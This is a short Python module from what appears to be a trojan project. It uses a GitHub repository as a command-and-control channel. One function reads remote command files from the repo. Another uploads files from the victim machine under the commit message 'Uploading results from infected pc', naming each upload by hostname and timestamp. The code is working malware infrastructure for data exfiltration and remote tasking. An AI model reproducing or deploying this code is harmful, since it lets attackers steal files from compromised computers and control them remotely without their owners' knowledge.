# Repo Manager: Connection to Github Repo

# Import packages
from .filemanager import readFile
from dotenv import load_dotenv
from datetime import datetime
from github import Github
import os

# Get all ENV variables
load_dotenv()
GITHUB_TOKEN = os.getenv("TOKEN_GITHUB")
g = Github(GITHUB_TOKEN)
repo = g.get_user().get_repo("pythonproject")


# Get content from given file in github repository
def readRemoteCommands(file):
    result_file = repo.get_contents(file)
    return result_file.decoded_content


# Write file to repository with given name
def writeToRepo(file, hostname):
    # Creating random name for each result
    content = readFile(file)
    time = datetime.now().strftime("%Y%m%d%H%M%S")

    pad = f"result/{hostname}-{time}-{file}"
    repo.create_file(
        pad,
        f"Uploading results from infected pc: {hostname}",
        content,
        branch="main",
    )
    print(f"{pad} aangemaakt")
